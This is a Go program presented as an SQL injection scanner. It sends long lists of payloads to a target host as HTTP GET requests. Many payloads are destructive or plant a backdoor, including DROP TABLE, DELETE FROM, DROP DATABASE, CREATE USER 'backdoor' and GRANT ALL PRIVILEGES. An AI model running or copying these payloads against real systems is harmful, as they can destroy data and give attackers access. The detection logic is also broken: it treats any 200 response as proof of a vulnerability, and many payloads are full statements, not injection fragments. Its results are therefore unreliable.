package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
)

func scan(url string) bool {
	// common SQL injection payloads
	payloads := []string{
		"' OR 1=1; --",
		"' OR '1'='1",
		"'58' OR 1 = 1;--'",
		"'58';DROP TABLE users--;",
		"SELECT * FROM users WHERE username = 'username' AND password = 'password' OR '1'='1';",
		"SELECT name, email FROM users WHERE id = 1 UNION SELECT password, NULL FROM sensitive_table;",
		"SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a';",
		"SELECT * FROM users WHERE id = '123' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables));",
		"SELECT * FROM users WHERE username = 'admin' AND IF(ASCII(SUBSTRING(database(),1,1))=97, BENCHMARK(10000000,MD5('A')),0);",
		"58 OR 1=1;SELECT name, email FROM users WHERE ID = '58' OR 1 = 1;--",
		"58 OR 1=1;select username, password from users where 1=1",
		"58 OR 1=1;select username, password from admins where 1=1",
		"58 OR 1=1;select username, password from root where 1=1",
		"58 OR 1=1;select user, pass from users where 1=1",
		"58 OR 1=1;select user, pass from admins where 1=1",
		"58 OR 1=1;select user, pass from root where 1=1",
		"58 OR 1=1;delete from users where 1=1",
		"58 OR 1=1;delete from admins where 1=1",
		"58 OR 1=1;delete from root where 1=1",
		"58 OR 1=1;drop table users",
		"58 OR 1=1;drop table admins",
		"58 OR 1=1;drop table root",
		"SELECT * FROM admins WHERE username = 'username' AND password = 'password' OR '1'='1';",
		"SELECT name, email FROM admins WHERE id = 1 UNION SELECT password, NULL FROM sensitive_table;",
		"SELECT * FROM admins WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a';",
		"SELECT * FROM admins WHERE id = '123' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables));",
		"SELECT * FROM admins WHERE username = 'admin' AND IF(ASCII(SUBSTRING(database(),1,1))=97, BENCHMARK(10000000,MD5('A')),0);",
		"1=1;SELECT name, email FROM users WHERE ID = '58' OR 1 = 1;--",
		"1=1;select username, password from users where 1=1",
		"1=1;select username, password from admins where 1=1",
		"1=1;select username, password from root where 1=1",
		"1=1;select user, pass from users where 1=1",
		"1=1;select user, pass from admins where 1=1",
		"1=1;select user, pass from root where 1=1",
		"1=1;delete from users where 1=1",
		"1=1;delete from admins where 1=1",
		"1=1;delete from root where 1=1",
		"1=1;drop table users",
		"1=1;drop table admins",
		"1=1;drop table root",
		"SELECT name, email FROM users WHERE ID = '58';DROP TABLE users--",
		"SELECT name, email FROM users WHERE ID = ?",
		"SELECT * FROM users WHERE username = 'admin'--'",
		"SELECT * FROM users WHERE username = 'admin' OR '1'='1'",
		"SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1--'",
		"SELECT * FROM users WHERE username = 'admin' UNION SELECT NULL, NULL, NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--'",
		"SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a'",
		"SELECT * FROM users WHERE id = 1; DROP TABLE users--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION ALL SELECT NULL, NULL, NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=(SELECT COUNT(*) FROM TABLE_NAME)--'",
		"SELECT * FROM users WHERE username = 'admin' AND EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--'",
		"SELECT * FROM users WHERE username = 'admin' AND SLEEP(5)--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION ALL SELECT NULL, NULL, NULL, CONCAT(username,':',password) FROM users--'",
		"SELECT * FROM users WHERE username = 'admin' AND IF(ASCII(SUBSTRING(password,1,1))=97, BENCHMARK(10000000,MD5('A')),0)--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION ALL SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION ALL SELECT NULL, NULL, NULL, CONCAT(username,'|',password) FROM users--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION ALL SELECT NULL, NULL, NULL, CONCAT('Database: ', DATABASE())--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION ALL SELECT NULL, NULL, NULL, column_name FROM information_schema.columns WHERE table_name='users'--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = MD5('password')",
		"SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = CHAR(97)",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION SELECT table_name FROM information_schema.tables--'",
		"SELECT * FROM users WHERE username = 'admin' AND 1=0 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR 1=1--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT NULL, NULL, NULL--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT 'a', 'b', 'c'--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT 'a', 'b', 'c'--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT NULL, table_name, NULL FROM information_schema.tables--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT NULL, column_name, NULL FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, NULL, NULL FROM information_schema.tables--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, NULL, NULL FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, column_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, column_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION SELECT NULL, NULL, NULL--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION SELECT 'a', 'b', 'c'--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT 'a', 'b', 'c'--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT NULL, table_name, NULL FROM information_schema.tables--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT NULL, column_name, NULL FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, NULL, NULL FROM information_schema.tables--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, NULL, NULL FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, column_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, table_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, column_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, column_name FROM information_schema.columns--'",
		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, table_name FROM information_schema.columns--'",
		"58 OR 1=1;select username, password from admins where 1=1",
		"58 OR 1=1;select username, password from root where 1=1",
	}

	insertPayloads := []string{
		"INSERT INTO users (username, password) VALUES ('amirhossein','12345');",
		"INSERT INTO admins (username, password) VALUES ('amirhossein','12345');",
		"INSERT INTO roots (username, password) VALUES ('amirhossein','12345');",
		"1=1;INSERT INTO users (username, password) VALUES ('amirhossein','12345');",
		"1=1;INSERT INTO roots (username, password) VALUES ('amirhossein','12345');",
		"1=1;INSERT INTO admins (username, password) VALUES ('amirhossein','12345');",
		"INSERT INTO users (username, password) VALUES ('admin', 'password');",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); DROP TABLE users;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); SELECT * FROM users;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); INSERT INTO logs (log) VALUES ('SQL injection attack');",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); UPDATE users SET password = 'hacked' WHERE username = 'admin';",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); DELETE FROM users;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); CREATE TABLE malicious_table (data TEXT);",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); ALTER TABLE users ADD COLUMN admin_flag BOOLEAN;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); DROP DATABASE;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); INSERT INTO sensitive_data (data) VALUES ((SELECT password FROM users WHERE username = 'admin'));",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); SELECT * FROM information_schema.tables;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'localhost';",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); UPDATE information_schema.tables SET table_name = 'hacked' WHERE table_schema = 'public';",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); INSERT INTO logs (log) VALUES ((SELECT table_name FROM information_schema.tables));",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); CREATE VIEW user_view AS SELECT * FROM users;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); CREATE FUNCTION evil_function RETURNS INT SONAME 'lib_mysqludf_sys.so';",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); CALL mysql.proc;",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); SET GLOBAL general_log = 'ON';",
		"INSERT INTO users (username, password) VALUES ('admin', 'password'); INSERT INTO users (username, password) SELECT username, password FROM users;",
		"58 OR 1=1;INSERT INTO users (username, password) VALUES ('amirhossein','12345');",
		"58 OR 1=1;INSERT INTO roots (username, password) VALUES ('amirhossein','12345');",
		"58 OR 1=1;INSERT INTO admins (username, password) VALUES ('amirhossein','12345');",
	}

	for _, payload := range payloads {
		resp, err := http.Get(url + payload)
		if err != nil {
			log.Println(fmt.Errorf("error checking URL: %w", err))

			continue
		}

		if resp.StatusCode == 200 {
			log.Println(fmt.Errorf("[*] SQL injection vulnerability found in %s", url))

			return true
		}
	}

	for _, payload := range insertPayloads {
		resp, err := http.Get(url + payload)
		if err != nil {
			log.Println(fmt.Errorf("error checking URL: %w", err))

			continue
		}

		if resp.StatusCode == 200 {
			log.Println(fmt.Errorf("[*] SQL injection vulnerability found in %s", url))

			return true
		}
	}

	return false
}

func main() {
	log.SetOutput(os.Stdout)

	var (
		hostFlag = flag.String("host", "localhost", "target host address")
	)

	flag.Parse()

	if scan(*hostFlag) {
		log.Println("not safe against sql-injection attacks!")

		os.Exit(1)
	}

	log.Println("safe against sql-injection attacks")

	os.Exit(0)
}
